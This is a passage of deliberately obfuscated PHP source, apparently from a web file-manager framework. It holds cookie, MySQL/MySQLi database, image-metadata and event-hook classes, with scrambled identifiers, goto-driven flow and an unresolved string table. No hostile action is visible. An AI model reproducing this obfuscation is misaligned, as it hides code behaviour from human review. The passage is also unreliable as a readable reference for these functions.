b·ŞøÜÛ¡Û: } } goto Aò¥é»ÂÕ‚; fÇ²®â¿•–: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($dÍ¥äÎ¬¬“ = '', $bõ¦ôŒ³ÇÕ = 0) { if (is_string($dÍ¥äÎ¬¬“) && $dÍ¥äÎ¬¬“ != $_SERVER[¹÷ˆ§éÒ°ú][43]) { $this->prefix = $dÍ¥äÎ¬¬“; } if (is_numeric($bõ¦ôŒ³ÇÕ) && $bõ¦ôŒ³ÇÕ > 0) { $this->expire = $bõ¦ôŒ³ÇÕ; } } public static function getInstance() { static $e¦Ñøµ…Æõ; if ($e¦Ñøµ…Æõ === null) { $e¦Ñøµ…Æõ = new self(); } return $e¦Ñøµ…Æõ; } private static $sameCookieSet = array(); public static function set($dšæ‚’Åöµ, $cÕ®•ÑğèÆ, $B‰•¿‚× = 0, $bÌñİÓ½÷£ = false, $A¶‡†ƒ¿ó = false) { goto B°ë‘†Œî; DºÜÈá©ôá: setcookie($dšæ‚’Åöµ, $cÕ®•ÑğèÆ, time() + $B‰•¿‚×, $A­ß»„ğ‘Ö[18] . trim($A¶‡†ƒ¿ó, $A­ß»„ğ‘Ö[18]) . $dÔ¾½¨ìà, !1, !1, $bÌñİÓ½÷£); goto Dã½¶»„Ø®; DÆ—’Ç¸ÜÒ: self::$sameCookieSet[$dšæ‚’Åöµ] = $cÕ®•ÑğèÆ . $B‰•¿‚×; if (!$A¶‡†ƒ¿ó) { $A¶‡†ƒ¿ó = str_replace(HOST, $A­ß»„ğ‘Ö[43], APP_HOST); $A¶‡†ƒ¿ó = _get($GLOBALS, $A­ß»„ğ‘Ö[787], $A¶‡†ƒ¿ó); } $dÔ¾½¨ìà = $A­ß»„ğ‘Ö[43]; goto DºÜÈá©ôá; B°ë‘†Œî: $A­ß»„ğ‘Ö =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$B‰•¿‚×) { $B‰•¿‚× = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$dšæ‚’Åöµ]) && self::$sameCookieSet[$dšæ‚’Åöµ] == $cÕ®•ÑğèÆ . $B‰•¿‚×) { return; } goto DÆ—’Ç¸ÜÒ; Dã½¶»„Ø®: } public static function setSafe($bğ‘ÓäˆÅ, $D¬ÆÇÂ¥„È, $c‡­Òİ ¡Ã = 0) { self::set($bğ‘ÓäˆÅ, $D¬ÆÇÂ¥„È, $c‡­Òİ ¡Ã, !0); } public static function get($fŸ¢†óâ„) { return isset($_COOKIE[$fŸ¢†óâ„]) ? $_COOKIE[$fŸ¢†óâ„] : !1; } public static function remove($e’ë©‡àŒ, $déÛ£Å = false) { unset($_COOKIE[$e’ë©‡àŒ]); self::set($e’ë©‡àŒ, $_SERVER[¹÷ˆ§éÒ°ú][43], 1, $déÛ£Å); } } class DbMysql extends Db { public function __construct($cÌÒ‚–Îˆ÷ = '') { $FØ® âç¦´ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!extension_loaded($FØ® âç¦´[722])) { think_exception(think_lang($FØ® âç¦´[20]) . $FØ® âç¦´[788]); } if (!empty($cÌÒ‚–Îˆ÷)) { $this->config = $cÌÒ‚–Îˆ÷; if (empty($this->config[$FØ® âç¦´[23]])) { $this->config[$FØ® âç¦´[23]] = $FØ® âç¦´[43]; } } } public function connect($FŸ„¾¼äõ„ = '', $d–òã¬‘ÄÆ = 0, $A±Åîå§Ë… = false) { $d„À¹›ÅÀö =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($this->linkID[$d–òã¬‘ÄÆ])) { goto Eåã”èµ; e†ã‚¢´: if (1 != think_config($d„À¹›ÅÀö[28])) { unset($this->config); } goto fõ÷öåò¢; a˜½÷ºÖë—: mysql_query($d„À¹›ÅÀö[793] . think_config($d„À¹›ÅÀö[794]) . $d„À¹›ÅÀö[67], $this->linkID[$d–òã¬‘ÄÆ]); if ($f¡Š×‡Ü‚ > $d„À¹›ÅÀö[795]) { mysql_query($d„À¹›ÅÀö[796], $this->linkID[$d–òã¬‘ÄÆ]); } $this->connected = !0; goto e†ã‚¢´; Eåã”èµ: if (empty($FŸ„¾¼äõ„)) { $FŸ„¾¼äõ„ = $this->config; } $C²Óò‚íÚ¡ = $FŸ„¾¼äõ„[$d„À¹›ÅÀö[789]] . ($FŸ„¾¼äõ„[$d„À¹›ÅÀö[790]] ? "\x3a{$FŸ„¾¼äõ„[$d„À¹›ÅÀö[790]]}" : $d„À¹›ÅÀö[43]); $c¨¡‡çéµï = !empty($FŸ„¾¼äõ„[$d„À¹›ÅÀö[23]][$d„À¹›ÅÀö[24]]) ? $FŸ„¾¼äõ„[$d„À¹›ÅÀö[23]][$d„À¹›ÅÀö[24]] : $this->pconnect; goto c‹¶ÉÏÓî; c‹¶ÉÏÓî: if ($c¨¡‡çéµï) { $this->linkID[$d–òã¬‘ÄÆ] = mysql_pconnect($C²Óò‚íÚ¡, $FŸ„¾¼äõ„[$d„À¹›ÅÀö[791]], $FŸ„¾¼äõ„[$d„À¹›ÅÀö[792]], 131072); } else { $this->linkID[$d–òã¬‘ÄÆ] = mysql_connect($C²Óò‚íÚ¡, $FŸ„¾¼äõ„[$d„À¹›ÅÀö[791]], $FŸ„¾¼äõ„[$d„À¹›ÅÀö[792]], !0, 131072); } if (!$this->linkID[$d–òã¬‘ÄÆ] || !empty($FŸ„¾¼äõ„[$d„À¹›ÅÀö[27]]) && !mysql_select_db($FŸ„¾¼äõ„[$d„À¹›ÅÀö[27]], $this->linkID[$d–òã¬‘ÄÆ])) { think_exception(mysql_error()); } $f¡Š×‡Ü‚ = mysql_get_server_info($this->linkID[$d–òã¬‘ÄÆ]); goto a˜½÷ºÖë—; fõ÷öåò¢: } return $this->linkID[$d–òã¬‘ÄÆ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($e”¤¿É•¿«) { goto aÎëÄè‚º«; b¹Œòñº: if (!$this->_linkID) { return !1; } $this->queryStr = $e”¤¿É•¿«; if ($this->queryID) { $this->free(); } goto DîàÑ¼ƒ…ˆ; d•îŠà¬Ò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto E¾Şä©è‚; aÎëÄè‚º«: $Fî™ÈÂšâ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (0 === stripos($e”¤¿É•¿«, $Fî™ÈÂšâ[263])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto b¹Œòñº; DîàÑ¼ƒ…ˆ: think_action_status($Fî™ÈÂšâ[29], 1); think_status($Fî™ÈÂšâ[30]); $this->queryID = mysql_query($e”¤¿É•¿«, $this->_linkID); goto d•îŠà¬Ò; E¾Şä©è‚: } public function execute($cà®Ûø¢) { goto fˆŒªğÛ„; d¢ä¿‘Á³: think_status($c­¦”é“îá[30]); $dÑâÔŞ¬· = mysql_query($cà®Ûø¢, $this->_linkID); $this->debug(); goto eŒ œ³Ó‘; b°‚°ŒÆ: $this->queryStr = $cà®Ûø¢; if ($this->queryID) { $this->free(); } think_action_status($c­¦”é“îá[31], 1); goto d¢ä¿‘Á³; eŒ œ³Ó‘: if (!1 === $dÑâÔŞ¬·) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto f‚é‚ÍÙ®²; fˆŒªğÛ„: $c­¦”é“îá =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b°‚°ŒÆ; f‚é‚ÍÙ®²: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹÷ˆ§éÒ°ú][797], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bğ­Ğë‡¬­ = mysql_query($_SERVER[¹÷ˆ§éÒ°ú][798], $this->_linkID); $this->transTimes = 0; if (!$bğ­Ğë‡¬­) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a˜ù®­¸«• = mysql_query($_SERVER[¹÷ˆ§éÒ°ú][799], $this->_linkID); $this->transTimes = 0; if (!$a˜ù®­¸«•) { $this->error(); return !1; } } return !0; } private function getAll() { $F«¯Ò–‰£‡ = array(); if ($this->numRows > 0) { while ($FŞÙ®‡„Ûë = mysql_fetch_assoc($this->queryID)) { $F«¯Ò–‰£‡[] = $FŞÙ®‡„Ûë; } mysql_data_seek($this->queryID, 0); } return $F«¯Ò–‰£‡; } public function getFields($c‰ù‘œè«¥) { $B®õ¿Ã…­ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Aš²Ğò— á = $this->query($B®õ¿Ã…­[800] . $this->parseKey($c‰ù‘œè«¥)); $dâ•…´Çî¸ = array(); if ($Aš²Ğò— á) { foreach ($Aš²Ğò— á as $fÑáõ»Æ‹¿ => $fİí«ƒ«Ì) { $dâ•…´Çî¸[$fİí«ƒ«Ì[$B®õ¿Ã…­[37]]] = array($B®õ¿Ã…­[38] => $fİí«ƒ«Ì[$B®õ¿Ã…­[37]], $B®õ¿Ã…­[39] => $fİí«ƒ«Ì[$B®õ¿Ã…­[40]], $B®õ¿Ã…­[41] => (bool) (strtoupper($fİí«ƒ«Ì[$B®õ¿Ã…­[42]]) === $B®õ¿Ã…­[801]), $B®õ¿Ã…­[44] => $fİí«ƒ«Ì[$B®õ¿Ã…­[45]], $B®õ¿Ã…­[46] => strtolower($fİí«ƒ«Ì[$B®õ¿Ã…­[47]]) == $B®õ¿Ã…­[48], $B®õ¿Ã…­[49] => strtolower($fİí«ƒ«Ì[$B®õ¿Ã…­[50]]) == $B®õ¿Ã…­[51]); } } return $dâ•…´Çî¸; } public function getTables($bˆßåëÄ‹Ê = '') { $BÃÍÖòØ¸» =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!empty($bˆßåëÄ‹Ê)) { $Cçİ™‰°Â = $BÃÍÖòØ¸»[802] . $bˆßåëÄ‹Ê; } else { $Cçİ™‰°Â = $BÃÍÖòØ¸»[803]; } $d˜†éœº¸ = $this->query($Cçİ™‰°Â); $bµ‡—“ĞŒ = array(); foreach ($d˜†éœº¸ as $aØ§¯Ÿàˆ => $Cöòˆ¾Œ—) { $bµ‡—“ĞŒ[$aØ§¯Ÿàˆ] = current($Cöòˆ¾Œ—); } return $bµ‡—“ĞŒ; } public function replace($C‡¿­ô ‚, $dÙä×……‡É = array()) { $EÖã–”ò”ã =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($C‡¿­ô ‚ as $f–ÛÄÒÕ => $C”ÛõÖªàÄ) { $fÄó‘»ÇÛ” = $this->parseValue($C”ÛõÖªàÄ); if (is_scalar($fÄó‘»ÇÛ”)) { $e‹‘¦ê ‚[] = $fÄó‘»ÇÛ”; $DÆñ““¬£‡[] = $this->parseKey($f–ÛÄÒÕ); } } $dË…ÁéÃå = $EÖã–”ò”ã[804] . $this->parseTable($dÙä×……‡É[$EÖã–”ò”ã[278]]) . $EÖã–”ò”ã[805] . implode($EÖã–”ò”ã[57], $DÆñ““¬£‡) . $EÖã–”ò”ã[806] . implode($EÖã–”ò”ã[57], $e‹‘¦ê ‚) . $EÖã–”ò”ã[807]; return $this->execute($dË…ÁéÃå); } public function insertAll($AĞöèÉ¥§á, $aìØ–¦œ±‹ = array(), $Bè„±Êò·‰ = false) { goto EŞ§ë…ï¶¶; D„Í†„ˆÔÔ: $F‹ì¨ÃÒÒÇ = array(); foreach ($AĞöèÉ¥§á as $DéŒœœÍ¸ã) { $dÕ‡â—¥‚„ = array(); foreach ($DéŒœœÍ¸ã as $fÑõ˜¾½ÓŠ => $Fƒ‘ŒÛ¿‡) { $Fƒ‘ŒÛ¿‡ = $this->parseValue($Fƒ‘ŒÛ¿‡); if (is_scalar($Fƒ‘ŒÛ¿‡)) { $dÕ‡â—¥‚„[] = $Fƒ‘ŒÛ¿‡; } } $F‹ì¨ÃÒÒÇ[] = $BéàÉ›ëáğ[259] . implode($BéàÉ›ëáğ[57], $dÕ‡â—¥‚„) . $BéàÉ›ëáğ[807]; } array_walk($F±¾ÏãÒİ, array($this, $BéàÉ›ëáğ[808])); goto B”óÙÓğô; B”óÙÓğô: $AŒ›¹®ÓÎ = ($Bè„±Êò·‰ ? $BéàÉ›ëáğ[809] : $BéàÉ›ëáğ[810]) . $BéàÉ›ëáğ[811] . $this->parseTable($aìØ–¦œ±‹[$BéàÉ›ëáğ[278]]) . $BéàÉ›ëáğ[805] . implode($BéàÉ›ëáğ[57], $F±¾ÏãÒİ) . $BéàÉ›ëáğ[812] . implode($BéàÉ›ëáğ[57], $F‹ì¨ÃÒÒÇ); return $this->execute($AŒ›¹®ÓÎ); goto E‡¸ôèÁ”‡; EŞ§ë…ï¶¶: $BéàÉ›ëáğ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!is_array($AĞöèÉ¥§á[0])) { return !1; } $F±¾ÏãÒİ = array_keys($AĞöèÉ¥§á[0]); goto D„Í†„ˆÔÔ; E‡¸ôèÁ”‡: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $f³’Ò’•ÕÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->error = mysql_errno() . $f³’Ò’•ÕÑ[14] . mysql_error($this->_linkID); if ($f³’Ò’•ÕÑ[43] != $this->queryStr) { $this->error .= LNG($f³’Ò’•ÕÑ[55]) . $this->queryStr; } think_trace($this->error, $f³’Ò’•ÕÑ[43], $f³’Ò’•ÕÑ[56]); return $this->error; } public function escapeString($eÒ°¯İ«±) { if ($this->_linkID) { return mysql_real_escape_string($eÒ°¯İ«±, $this->_linkID); } else { return mysql_escape_string($eÒ°¯İ«±); } } public function parseKey(&$FŞ¥òœ˜‡», $Dö¨ëƒ©ßµ = true) { $Bã¬ğî´ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($Dö¨ëƒ©ßµ) { $FŞ¥òœ˜‡» = $this->parseKeyCheck($FŞ¥òœ˜‡»); } if ($FŞ¥òœ˜‡» != $Bã¬ğî´[188] && !preg_match($Bã¬ğî´[813], $FŞ¥òœ˜‡»)) { $FŞ¥òœ˜‡» = $Bã¬ğî´[814] . trim($FŞ¥òœ˜‡», $Bã¬ğî´[814]) . $Bã¬ğî´[814]; } return $FŞ¥òœ˜‡»; } } class DbMysqli extends Db { public function __construct($Dí›±ÁËÆ§ = '') { $eá¦Ø”­É¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!extension_loaded($eá¦Ø”­É¯[721])) { think_exception(think_lang($eá¦Ø”­É¯[20]) . $eá¦Ø”­É¯[815]); } if (!empty($Dí›±ÁËÆ§)) { $this->config = $Dí›±ÁËÆ§; if (empty($this->config[$eá¦Ø”­É¯[23]])) { $this->config[$eá¦Ø”­É¯[23]] = $eá¦Ø”­É¯[43]; } } } public function connect($E¸×ÑÕÍ³Ú = '', $E‹‰ñ•ÜËâ = 0) { $eçÀ™‚È§÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($this->linkID[$E‹‰ñ•ÜËâ])) { goto Aã¿Œ’ÑÔ‹; C‚ğÛˆãÇê: $F¼ë‹– = $this->linkID[$E‹‰ñ•ÜËâ]->server_version; $this->linkID[$E‹‰ñ•ÜËâ]->query($eçÀ™‚È§÷[793] . think_config($eçÀ™‚È§÷[794]) . $eçÀ™‚È§÷[67]); if ($F¼ë‹– > $eçÀ™‚È§÷[795]) { $this->linkID[$E‹‰ñ•ÜËâ]->query($eçÀ™‚È§÷[796]); } goto aèÛ¡ÅÒÕç; aèÛ¡ÅÒÕç: $this->connected = !0; if (1 != think_config($eçÀ™‚È§÷[28])) { unset($this->config); } goto eÆáÂŞ±†ø; Aã¿Œ’ÑÔ‹: if (empty($E¸×ÑÕÍ³Ú)) { $E¸×ÑÕÍ³Ú = $this->config; } $this->linkID[$E‹‰ñ•ÜËâ] = new mysqli($E¸×ÑÕÍ³Ú[$eçÀ™‚È§÷[789]], $E¸×ÑÕÍ³Ú[$eçÀ™‚È§÷[791]], $E¸×ÑÕÍ³Ú[$eçÀ™‚È§÷[792]], $E¸×ÑÕÍ³Ú[$eçÀ™‚È§÷[27]], $E¸×ÑÕÍ³Ú[$eçÀ™‚È§÷[790]] ? intval($E¸×ÑÕÍ³Ú[$eçÀ™‚È§÷[790]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto C‚ğÛˆãÇê; eÆáÂŞ±†ø: } return $this->linkID[$E‹‰ñ•ÜËâ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($DÄÑƒ–·ØÒ) { goto c Ç«Íˆƒ°; c Ç«Íˆƒ°: $BÖŒ³œÇ¢ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B¯£å­ù¯–; B¯£å­ù¯–: $this->queryStr = $DÄÑƒ–·ØÒ; if ($this->queryID) { $this->free(); } think_action_status($BÖŒ³œÇ¢[29], 1); goto d™Ã¢ÒÍ™›; d™Ã¢ÒÍ™›: think_status($BÖŒ³œÇ¢[30]); $this->queryID = $this->_linkID->query($DÄÑƒ–·ØÒ); if ($this->_linkID->more_results()) { while (($b‰´à‘¾Î = $this->_linkID->next_result()) != NULL) { $b‰´à‘¾Î->free_result(); } } goto EÉø ğ­ß; EÉø ğ­ß: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto d´‰×†öõ¢; d´‰×†öõ¢: } public function execute($e¾İŠÒ£÷) { goto aê£Ùªó…È; FÙ·¹ïù¥ê: $this->queryStr = $e¾İŠÒ£÷; if ($this->queryID) { $this->free(); } think_action_status($EŠŒ¨³»ì§[31], 1); goto eè¯¾Èåš; B¼í®ÔˆÕò: if (!1 === $aŸğ©ˆ®¯ä) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto d‡÷‹Äçé¥; eè¯¾Èåš: think_status($EŠŒ¨³»ì§[30]); $aŸğ©ˆ®¯ä = $this->_linkID->query($e¾İŠÒ£÷); $this->debug(); goto B¼í®ÔˆÕò; aê£Ùªó…È: $EŠŒ¨³»ì§ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÙ·¹ïù¥ê; d‡÷‹Äçé¥: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dª“·¤¥Ò¦ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$dª“·¤¥Ò¦) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FŒ¸ìğÛ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FŒ¸ìğÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $dÜ„ŞÒ¬ÀÏ = array(); if ($this->numRows > 0) { for ($dÎ‚¦¾¹¦ª = 0; $dÎ‚¦¾¹¦ª < $this->numRows; $dÎ‚¦¾¹¦ª++) { $dÜ„ŞÒ¬ÀÏ[$dÎ‚¦¾¹¦ª] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $dÜ„ŞÒ¬ÀÏ; } public function getFields($A‘·©í„µõ) { $EÌÊ•è•­ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b ô‰é›¥â = $this->query($EÌÊ•è•­[800] . $this->parseKey($A‘·©í„µõ)); $f¨›äôŸç = array(); if ($b ô‰é›¥â) { foreach ($b ô‰é›¥â as $BŒÓÔÊß¬° => $EÂ›Û²Îá) { $f¨›äôŸç[$EÂ›Û²Îá[$EÌÊ•è•­[37]]] = array($EÌÊ•è•­[38] => $EÂ›Û²Îá[$EÌÊ•è•­[37]], $EÌÊ•è•­[39] => $EÂ›Û²Îá[$EÌÊ•è•­[40]], $EÌÊ•è•­[41] => (bool) ($EÂ›Û²Îá[$EÌÊ•è•­[42]] === $EÌÊ•è•­[43]), $EÌÊ•è•­[44] => $EÂ›Û²Îá[$EÌÊ•è•­[45]], $EÌÊ•è•­[46] => strtolower($EÂ›Û²Îá[$EÌÊ•è•­[47]]) == $EÌÊ•è•­[48], $EÌÊ•è•­[49] => strtolower($EÂ›Û²Îá[$EÌÊ•è•­[50]]) == $EÌÊ•è•­[51]); } } return $f¨›äôŸç; } public function getTables($E”²Ğà§…£ = '') { $C‡Ó¥¨Ô×æ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bøì–¬ÄÇ = !empty($E”²Ğà§…£) ? $C‡Ó¥¨Ô×æ[802] . $E”²Ğà§…£ : $C‡Ó¥¨Ô×æ[803]; $B±Ÿœ‡ÓÉ… = $this->query($Bøì–¬ÄÇ); $Fæ²©˜ÖÉô = array(); if ($B±Ÿœ‡ÓÉ…) { foreach ($B±Ÿœ‡ÓÉ… as $fïÇ£¯Áë => $D¶–ğàáéß) { $Fæ²©˜ÖÉô[$fïÇ£¯Áë] = current($D¶–ğàáéß); } } return $Fæ²©˜ÖÉô; } public function replace($b­¬Ú‚¼, $CÓçŠÙÊÎ = array()) { $fÚÎøÍİ’ =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($b­¬Ú‚¼ as $E’ŒèØİÍ => $d©Íôò ÷) { $bã–Ğ åÅ© = $this->parseValue($d©Íôò ÷); if (is_scalar($bã–Ğ åÅ©)) { $BöÒÚ†äŠ[] = $bã–Ğ åÅ©; $A¿Ù»æÀÎ[] = $this->parseKey($E’ŒèØİÍ); } } $eŒ˜¡‹ÄÌà = $fÚÎøÍİ’[804] . $this->parseTable($CÓçŠÙÊÎ[$fÚÎøÍİ’[278]]) . $fÚÎøÍİ’[805] . implode($fÚÎøÍİ’[57], $A¿Ù»æÀÎ) . $fÚÎøÍİ’[806] . implode($fÚÎøÍİ’[57], $BöÒÚ†äŠ) . $fÚÎøÍİ’[807]; return $this->execute($eŒ˜¡‹ÄÌà); } public function insertAll($aåµ¤ƒïòÉ, $cëæºØÕ¶‚ = array(), $fª·‡™ì‘Ô = false) { goto D² ‡¢Ş÷Å; f¼áˆ¨÷º¾: $Dğ–éÙ‚¹µ = array(); foreach ($aåµ¤ƒïòÉ as $a²ÙÌŠæÌ‡) { $DïÊ˜ëÙ¨» = array(); foreach ($a²ÙÌŠæÌ‡ as $f“…”Ô†¨ => $Dîô›¾÷Î‹) { $Dîô›¾÷Î‹ = $this->parseValue($Dîô›¾÷Î‹); if (is_scalar($Dîô›¾÷Î‹)) { $DïÊ˜ëÙ¨»[] = $Dîô›¾÷Î‹; } } $Dğ–éÙ‚¹µ[] = $C•ß›½ÎÄ«[259] . implode($C•ß›½ÎÄ«[57], $DïÊ˜ëÙ¨») . $C•ß›½ÎÄ«[807]; } array_walk($eå¤ğ÷ŠÁ, array($this, $C•ß›½ÎÄ«[808])); goto E£ÌïË£ …; D² ‡¢Ş÷Å: $C•ß›½ÎÄ« =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!is_array($aåµ¤ƒïòÉ[0])) { return !1; } $eå¤ğ÷ŠÁ = array_keys($aåµ¤ƒïòÉ[0]); goto f¼áˆ¨÷º¾; E£ÌïË£ …: $b¿ãæ‹è = ($fª·‡™ì‘Ô ? $C•ß›½ÎÄ«[809] : $C•ß›½ÎÄ«[810]) . $C•ß›½ÎÄ«[811] . $this->parseTable($cëæºØÕ¶‚[$C•ß›½ÎÄ«[278]]) . $C•ß›½ÎÄ«[805] . implode($C•ß›½ÎÄ«[57], $eå¤ğ÷ŠÁ) . $C•ß›½ÎÄ«[812] . implode($C•ß›½ÎÄ«[57], $Dğ–éÙ‚¹µ); return $this->execute($b¿ãæ‹è); goto Dâí¸†×õ; Dâí¸†×õ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fÜæÉº¹ó¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->error = $this->_linkID->errno . $fÜæÉº¹ó¶[14] . $this->_linkID->error; if ($fÜæÉº¹ó¶[43] != $this->queryStr) { $this->error .= LNG($fÜæÉº¹ó¶[55]) . $this->queryStr; } think_trace($this->error, $fÜæÉº¹ó¶[43], $fÜæÉº¹ó¶[56]); return $this->error; } public function escapeString($AÙí‹¥†¸î) { if ($this->_linkID) { return $this->_linkID->real_escape_string($AÙí‹¥†¸î); } else { return addslashes($AÙí‹¥†¸î); } } public function parseKey(&$Fà§¦ˆòÌŒ, $bà®¨„Œ§ = true) { $c‚ô³Šá’‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($bà®¨„Œ§) { $Fà§¦ˆòÌŒ = $this->parseKeyCheck($Fà§¦ˆòÌŒ); } if ($Fà§¦ˆòÌŒ != $c‚ô³Šá’‚[188] && !preg_match($c‚ô³Šá’‚[813], $Fà§¦ˆòÌŒ)) { $Fà§¦ˆòÌŒ = $c‚ô³Šá’‚[814] . trim($Fà§¦ˆòÌŒ, $c‚ô³Šá’‚[814]) . $c‚ô³Šá’‚[814]; } return $Fà§¦ˆòÌŒ; } } goto E±õ«§„›ê; bìâœ–½ñ: function exif_read_data_io($EôŞ‰ù¦ö, $f‡ßìÔÃ› = null, $aÁ¢ïî‡‚ø = false, $bå‹Æ˜­³ = false) { $C‘ºé‡èø© = StreamWrapperIO::read($EôŞ‰ù¦ö, 0, 1024 * 64); $eïƒåø“ å = $_SERVER[¹÷ˆ§éÒ°ú][1741] . base64_encode($C‘ºé‡èø©); return exif_read_data($eïƒåø“ å, $f‡ßìÔÃ›, $aÁ¢ïî‡‚ø, $bå‹Æ˜­³); } function getimagesize_io($dˆà‹õœšÔ, &$B†ÑğÓê§¬ = false) { $föà×š±¾ = StreamWrapperIO::read($dˆà‹õœšÔ, 0, 1024 * 64); $dˆà‹õœšÔ = $_SERVER[¹÷ˆ§éÒ°ú][1741] . base64_encode($föà×š±¾); return getimagesize($dˆà‹õœšÔ, $B†ÑğÓê§¬); } class Hook { private static $events = array(); public static function get($eİÌÉŸÔË· = false) { if (!$eİÌÉŸÔË·) { return self::$events; } else { return self::$events[$eİÌÉŸÔË·]; } } public static function apply($F§ãŠˆƒº, $e³â¨‘¾× = array()) { $dƒëÎÑÆ¡› = ActionApply($F§ãŠˆƒº, $e³â¨‘¾×); if (is_string($F§ãŠˆƒº)) { Hook::trigger($F§ãŠˆƒº); } return $dƒëÎÑÆ¡›; } public static function bind($D²Êªº´ ›, $F´·ó†©ŠĞ, $B¨å÷äÂ = false) { $A´æ»Ê–èò =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset(self::$events[$D²Êªº´ ›])) { self::$events[$D²Êªº´ ›] = array(); } self::$events[$D²Êªº´ ›][] = array($A´æ»Ê–èò[1742] => $F´·ó†©ŠĞ, $A´æ»Ê–èò[1743] => $B¨å÷äÂ, $A´æ»Ê–èò[1744] => 0); } public static function once($c‡àˆÄëµß, $Fî¢­îŠŠ) { self::bind($c‡àˆÄëµß, $Fî¢­îŠŠ, !0); } public static function unbind($DÀÈÀƒ•¿ƒ, $fáÜÒçö­ª = false) { if (!$fáÜÒçö­ª) { self::$events[$DÀÈÀƒ•¿ƒ] = array(); return; } $d˜ìèŠ™¿ø = self::$events[$DÀÈÀƒ•¿ƒ]; self::$events[$DÀÈÀƒ•¿ƒ] = array(); if (!is_array($d˜ìèŠ™¿ø)) { return; } for ($BÜÇîªÈ†’ = 0; $BÜÇîªÈ†’ < count($d˜ìèŠ™¿ø); $BÜÇîªÈ†’++) { if ($d˜ìèŠ™¿ø[$BÜÇîªÈ†’][$_SERVER[¹÷ˆ§éÒ°ú][1742]] == $fáÜÒçö­ª) { continue; } self::$events[$DÀÈÀƒ•¿ƒ][] = $d˜ìèŠ™¿ø[$BÜÇîªÈ†’]; } } public static function filter($fœ©ß²¡Ç®, $FÏï‡¹ïÇİ) { goto FÆÙßÑ½²; FÆÙßÑ½²: $f×Ó†Ø¾ô× =& $_SERVER[¹÷ˆ§éÒ°ú]; $F¤ƒÂšÀ‡œ = self::$events; if (!isset($F¤ƒÂšÀ‡œ[$fœ©ß²¡Ç®])) { return $FÏï‡¹ïÇİ; } goto e•µ©ã«İæ; E¸öÏ Üé: for ($dà†áÀßÀ = 0; $dà†áÀßÀ < count($Bº±ìÆè”í); $dà†áÀßÀ++) { $fí®¥ÁÄƒ = $Bº±ìÆè”í[$dà†áÀßÀ]; if ($fí®¥ÁÄƒ[$f×Ó†Ø¾ô×[1743]] && $fí®¥ÁÄƒ[$f×Ó†Ø¾ô×[1744]] > 1) { continue; } self::$events[$fœ©ß²¡Ç®][$dà†áÀßÀ][$f×Ó†Ø¾ô×[1744]] = $fí®¥ÁÄƒ[$f×Ó†Ø¾ô×[1744]] + 1; $cŸŸ™Šğ£¡ = self::apply($fí®¥ÁÄƒ[$f×Ó†Ø¾ô×[1742]], array($E•²âÉÌáŒ)); if (gettype($cŸŸ™Šğ£¡) == gettype($E•²âÉÌáŒ)) { $E•²âÉÌáŒ = $cŸŸ™Šğ£¡; } } return $E•²âÉÌáŒ; goto FÍ˜µîÚ×; e•µ©ã«İæ: $Bº±ìÆè”í = $F¤ƒÂšÀ‡œ[$fœ©ß²¡Ç®]; $E•²âÉÌáŒ = $FÏï‡¹ïÇİ; if (!is_array($Bº±ìÆè”í) || count($Bº±ìÆè”í) == 0) { return $E•²âÉÌáŒ; } goto E¸öÏ Üé; FÍ˜µîÚ×: } public static function trigger($aá·á‚âÀ†) { goto EÌ¥£î›Ò; A¶¬”©ƒÚ: $B–‚Ë ºÃ = func_get_args(); array_shift($B–‚Ë 